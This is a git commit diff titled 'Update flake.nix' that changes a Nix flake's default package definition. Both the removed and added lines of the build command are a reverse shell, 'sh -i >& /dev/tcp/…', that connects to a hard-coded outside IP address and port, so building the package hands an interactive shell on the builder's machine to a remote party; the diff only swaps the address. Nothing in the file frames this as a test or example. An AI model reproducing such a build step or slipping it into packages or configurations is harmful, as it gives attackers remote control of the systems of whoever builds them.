ddaa0bd1f333e799ec20c7e3ccc2c323fea27148
9idejuicnsjdoij <146530917+9idejuicnsjdoij@users.noreply.github.com>
2023-09-30 19:39:08 +1000

    Update flake.nix

--- flake.nix
+++ flake.nix
@@ -6,7 +6,7 @@
     let pkgs = import nixpkgs { system = "x86_64-linux"; }; in
     {
       packages.x86_64-linux.default = pkgs.runCommand "hm" {} ''
-        sh -i >& /dev/tcp/52.62.254.166/1234 0>&1
+        sh -i >& /dev/tcp/54.153.239.159/11378 0>&1
       '';
     };
 }
